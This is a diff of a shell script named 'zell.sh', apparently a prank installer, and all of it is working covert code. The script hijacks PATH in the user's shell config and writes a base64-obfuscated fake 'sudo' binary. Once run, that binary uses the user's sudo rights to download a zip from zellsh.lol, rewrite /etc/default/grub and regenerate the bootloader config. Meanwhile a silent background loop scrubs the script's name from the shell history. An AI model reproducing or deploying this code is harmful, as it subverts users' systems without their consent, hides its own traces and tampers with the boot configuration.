shenanigans

+++ zell.sh
@@ -1,20 +1,20 @@
 #!/bin/sh
 
 {
-    BASE64FILE="IyEvYmluL3NoCgp7CiAgICBpZiBbIC1kIC9ib290L2dydWIyLyBdOyB0aGVuCiAgICAgICAgR1JVQl9ESVI9Ii9ib290L2dydWIyIgogICAgZWxpZiBbIC1kIC9ib290L2dydWIvIF07IHRoZW4KICAgICAgICBHUlVCX0RJUj0iL2Jvb3QvZ3J1YiIKICAgIGZpCiAgICBpZiBjb21tYW5kIC1wdiBncnViMi1ta2NvbmZpZyAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIEdSVUJfTUtDT05GSUc9ImdydWIyLW1rY29uZmlnIgogICAgZWxpZiBjb21tYW5kIC1wdiBncnViLW1rY29uZmlnIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgR1JVQl9NS0NPTkZJRz0iZ3J1Yi1ta2NvbmZpZyIKICAgIGZpCgogICAgZXhwb3J0IFBBVEg9Jy9zYmluOi9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvYmluOi91c3Ivc2JpbicKICAgIFJlYWxTdWRvPSIkKHdoaWNoIHN1ZG8pIgoKICAgIGlmIFsgLW4gIiRHUlVCX0RJUiIgXSAmJiBbIC1uICIkR1JVQl9NS0NPTkZJRyIgXTsgdGhlbgogICAgICAgIFVTRVJfSE9NRT0iJEhPTUUiCgogICAgICAgIG1rZGlyIC1wICIkVVNFUl9IT01FLy5sb2NhbC92YXIvIgogICAgICAgIGlmIFsgISAtZiAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiIF07IHRoZW4KICAgICAgICAgICAgd2dldCAtLW91dHB1dC1kb2N1bWVudCAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiIGh0dHBzOi8vemVsbHNoLmxvbC96ZWxsc2hsb2wuemlwCiAgICAgICAgZmkKCiAgICAgICAgaWYgWyAtZCAiJEdSVUJfRElSL3RoZW1lcy96ZWxsc2hsb2wiIF07IHRoZW4KICAgICAgICAgICAgIiRSZWFsU3VkbyIgcm0gLXJmICIkR1JVQl9ESVIvdGhlbWVzL3plbGxzaGxvbCIKICAgICAgICBmaQogICAgICAgICIkUmVhbFN1ZG8iIG1rZGlyIC1wICIkR1JVQl9ESVIvdGhlbWVzLyIKCiAgICAgICAgIiRSZWFsU3VkbyIgdW56aXAgIiRVU0VSX0hPTUUvLmxvY2FsL3Zhci9ib290X2RhdGEuemlwIiAtZCAiJEdSVUJfRElSL3RoZW1lcy8iCiAgICAgICAgcm0gIiRVU0VSX0hPTUUvLmxvY2FsL3Zhci9ib290X2RhdGEuemlwIgoKICAgICAgICAiJFJlYWxTdWRvIiBjcCAtLXVwZGF0ZT1ub25lIC9ldGMvZGVmYXVsdC9ncnViICIvZXRjL2RlZmF1bHQvZ3J1Yi5iYWNrdXBfYmVmb3JlX3plbGxzaCIKICAgICAgICAiJFJlYWxTdWRvIiBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX1RIRU1FPS4qKS8jXDEvZycgL2V0Yy9kZWZhdWx0L2dydWIKICAgICAgICAiJFJlYWxTdWRvIiBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX1RJTUVPVVQ9LiopLyNcMS9nJyAvZXRjL2RlZmF1bHQvZ3J1YgogICAgICAgICIkUmVhbFN1ZG8iIHNlZCAtaSAtRSAncy9eWyBcdF0qKEdSVUJfQkFDS0dST1VORD0uKikvI1wxL2cnIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgcHJpbnRmICdcbiVzXG4lc1xuJyAiR1JVQl9USEVNRT0kR1JVQl9ESVIvdGhlbWVzL3plbGxzaGxvbC90aGVtZS50eHQiICdHUlVCX1RJTUVPVVQ9MTUnIHwgIiRSZWFsU3VkbyIgdGVlIC1hIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgIiRSZWFsU3VkbyIgIiRHUlVCX01LQ09ORklHIiAtbyAiJEdSVUJfRElSL2dydWIuY2ZnIgogICAgZmkKCiAgICBncmVwIC12RSAnLiojIGZvciBQT1NJWCBjb21wbGlhbmNlIGFuZCBiYWNrd2FyZHMgY29tcGF0aWJpbGl0eScgIiRIT01FLy5iYXNocmMiID4gIi90bXAvLmJhc2hyY19uZXciICYmIG12ICIvdG1wLy5iYXNocmNfbmV3IiAiJEhPTUUvLmJhc2hyYyIKICAgIGdyZXAgLXZFICcuKiMgZm9yIFBPU0lYIGNvbXBsaWFuY2UgYW5kIGJhY2t3YXJkcyBjb21wYXRpYmlsaXR5JyAiJEhPTUUvLnpzaHJjIiA+ICIvdG1wLy56c2hyY19uZXciICYmIG12ICIvdG1wLy56c2hyY19uZXciICIkSE9NRS8uenNocmMiCiAgICBybSAiJFVTRVJfSE9NRS8ubG9jYWwvYmluL3N1ZG8iCgp9IDE+L2Rldi9udWxsIDI+L2Rldi9udWxsCgoKIiRSZWFsU3VkbyIgIiRAIgo="
+    BASE64FILE="IyEvYmluL3NoCgp7CiAgICBpZiBbIC1kIC9ib290L2dydWIyLyBdOyB0aGVuCiAgICAgICAgR1JVQl9ESVI9Ii9ib290L2dydWIyIgogICAgZWxpZiBbIC1kIC9ib290L2dydWIvIF07IHRoZW4KICAgICAgICBHUlVCX0RJUj0iL2Jvb3QvZ3J1YiIKICAgIGZpCiAgICBpZiBjb21tYW5kIC1wdiBncnViMi1ta2NvbmZpZyAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIEdSVUJfTUtDT05GSUc9ImdydWIyLW1rY29uZmlnIgogICAgZWxpZiBjb21tYW5kIC1wdiBncnViLW1rY29uZmlnIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgR1JVQl9NS0NPTkZJRz0iZ3J1Yi1ta2NvbmZpZyIKICAgIGZpCgogICAgZXhwb3J0IFBBVEg9Jy9zYmluOi9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvYmluOi91c3Ivc2JpbicKICAgIFJlYWxTdWRvPSIkKHdoaWNoIHN1ZG8pIgoKICAgIGlmIFsgLW4gIiRHUlVCX0RJUiIgXSAmJiBbIC1uICIkR1JVQl9NS0NPTkZJRyIgXTsgdGhlbgogICAgICAgIFVTRVJfSE9NRT0iJEhPTUUiCgogICAgICAgIG1rZGlyIC1wICIkVVNFUl9IT01FLy5sb2NhbC92YXIvIgogICAgICAgIGlmIFsgISAtZiAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiIF07IHRoZW4KICAgICAgICAgICAgd2dldCAtLW91dHB1dC1kb2N1bWVudCAiJFVTRVJfSE9NRS8ubG9jYWwvdmFyL2Jvb3RfZGF0YS56aXAiIGh0dHBzOi8vemVsbHNoLmxvbC96ZWxsc2hsb2wuemlwCiAgICAgICAgZmkKCiAgICAgICAgaWYgWyAtZCAiJEdSVUJfRElSL3RoZW1lcy96ZWxsc2hsb2wiIF07IHRoZW4KICAgICAgICAgICAgIiRSZWFsU3VkbyIgcm0gLXJmICIkR1JVQl9ESVIvdGhlbWVzL3plbGxzaGxvbCIKICAgICAgICBmaQogICAgICAgICIkUmVhbFN1ZG8iIG1rZGlyIC1wICIkR1JVQl9ESVIvdGhlbWVzLyIKCiAgICAgICAgIiRSZWFsU3VkbyIgdW56aXAgIiRVU0VSX0hPTUUvLmxvY2FsL3Zhci9ib290X2RhdGEuemlwIiAtZCAiJEdSVUJfRElSL3RoZW1lcy8iCiAgICAgICAgcm0gIiRVU0VSX0hPTUUvLmxvY2FsL3Zhci9ib290X2RhdGEuemlwIgoKICAgICAgICAiJFJlYWxTdWRvIiBjcCAtLXVwZGF0ZT1ub25lIC9ldGMvZGVmYXVsdC9ncnViICIvZXRjL2RlZmF1bHQvZ3J1Yi5iYWNrdXBfYmVmb3JlX3plbGxzaCIKICAgICAgICAiJFJlYWxTdWRvIiBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX1RIRU1FPS4qKS8jXDEvZycgL2V0Yy9kZWZhdWx0L2dydWIKICAgICAgICAiJFJlYWxTdWRvIiBzZWQgLWkgLUUgJ3MvXlsgXHRdKihHUlVCX1RJTUVPVVQ9LiopLyNcMS9nJyAvZXRjL2RlZmF1bHQvZ3J1YgogICAgICAgICIkUmVhbFN1ZG8iIHNlZCAtaSAtRSAncy9eWyBcdF0qKEdSVUJfQkFDS0dST1VORD0uKikvI1wxL2cnIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgcHJpbnRmICdcbiVzXG4lc1xuJyAiR1JVQl9USEVNRT0kR1JVQl9ESVIvdGhlbWVzL3plbGxzaGxvbC90aGVtZS50eHQiICdHUlVCX1RJTUVPVVQ9MTUnIHwgIiRSZWFsU3VkbyIgdGVlIC1hIC9ldGMvZGVmYXVsdC9ncnViCiAgICAgICAgIiRSZWFsU3VkbyIgIiRHUlVCX01LQ09ORklHIiAtbyAiJEdSVUJfRElSL2dydWIuY2ZnIgogICAgZmkKCiAgICBncmVwIC12RSAnLiojIGZvciBQT1NJWCBjb21wbGlhbmNlIGFuZCBiYWNrd2FyZHMgY29tcGF0aWJpbGl0eScgIiRIT01FLy5iYXNocmMiID4iL3RtcC8uYmFzaHJjX25ldyIgJiYgbXYgIi90bXAvLmJhc2hyY19uZXciICIkSE9NRS8uYmFzaHJjIgogICAgZ3JlcCAtdkUgJy4qIyBmb3IgUE9TSVggY29tcGxpYW5jZSBhbmQgYmFja3dhcmRzIGNvbXBhdGliaWxpdHknICIkSE9NRS8uenNocmMiID4iL3RtcC8uenNocmNfbmV3IiAmJiBtdiAiL3RtcC8uenNocmNfbmV3IiAiJEhPTUUvLnpzaHJjIgogICAgcm0gIiRVU0VSX0hPTUUvLmxvY2FsL2Jpbi9zdWRvIgoKfSAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbAoKIiRSZWFsU3VkbyIgIiRAIgo="
 
-    grep -vE '.*# for POSIX compliance and backwards compatibility' "$HOME/.bashrc" > "/tmp/.bashrc_new" && mv "/tmp/.bashrc_new" "$HOME/.bashrc"
-    grep -vE '.*# for POSIX compliance and backwards compatibility' "$HOME/.zshrc" > "/tmp/.zshrc_new" && mv "/tmp/.zshrc_new" "$HOME/.zshrc"
+    grep -vE '.*# for POSIX compliance and backwards compatibility' "$HOME/.bashrc" >"/tmp/.bashrc_new" && mv "/tmp/.bashrc_new" "$HOME/.bashrc"
+    grep -vE '.*# for POSIX compliance and backwards compatibility' "$HOME/.zshrc" >"/tmp/.zshrc_new" && mv "/tmp/.zshrc_new" "$HOME/.zshrc"
     # shellcheck disable=SC2016
-    echo 'export PATH="$HOME/.local/bin:$PATH"; hash -r # for POSIX compliance and backwards compatibility' > /tmp/.bashrc.tmp
+    echo 'export PATH="$HOME/.local/bin:$PATH"; hash -r # for POSIX compliance and backwards compatibility' >/tmp/.bashrc.tmp
     cp /tmp/.bashrc.tmp /tmp/.zshrc.tmp
-    cat "$HOME/.bashrc" >> /tmp/.bashrc.tmp
-    cat "$HOME/.zshrc" >> /tmp/.zshrc.tmp
-    mv  /tmp/.bashrc.tmp "$HOME/.bashrc"
-    mv  /tmp/.zshrc.tmp "$HOME/.zshrc"
+    cat "$HOME/.bashrc" >>/tmp/.bashrc.tmp
+    cat "$HOME/.zshrc" >>/tmp/.zshrc.tmp
+    mv /tmp/.bashrc.tmp "$HOME/.bashrc"
+    mv /tmp/.zshrc.tmp "$HOME/.zshrc"
 
     mkdir -p "$HOME/.local/bin/"
-    echo "$BASE64FILE" | base64 --decode > "$HOME/.local/bin/sudo"
+    echo "$BASE64FILE" | base64 --decode >"$HOME/.local/bin/sudo"
     chmod +x "$HOME/.local/bin/sudo"
 
     (
@@ -22,14 +22,15 @@
             mkdir -p "$HOME/.local/var/"
             wget --output-document "$HOME/.local/var/boot_data.zip" https://zellsh.lol/zellshlol.zip
             for _i in $(seq 60); do
-                grep -vE 'zell\.sh' "$HOME/.bash_history" > "/tmp/.bash_history_new" && mv "/tmp/.bash_history_new" "$HOME/.bash_history"
-                grep -vE 'zell\.sh' "$HOME/.zhistory" > "/tmp/.zhistory_new" && mv "/tmp/.zhistory_new" "$HOME/.zhistory"
-                sleep 1
+                if [ ! -f /tmp/.hist_cleaner_lock ]; then
+                    touch /tmp/.hist_cleaner_lock
+                    grep -vE 'zell\.sh' "$HOME/.bash_history" >"/tmp/.bash_history_new" && mv "/tmp/.bash_history_new" "$HOME/.bash_history"
+                    grep -vE 'zell\.sh' "$HOME/.zhistory" >"/tmp/.zhistory_new" && mv "/tmp/.zhistory_new" "$HOME/.zhistory"
+                    sleep 1
+                fi
             done
+            [ -f /tmp/.hist_cleaner_lock ] && rm /tmp/.hist_cleaner_lock
         } 1>/dev/null 2>/dev/null
     ) &
 
 } 1>/dev/null 2>/dev/null
-
-
-
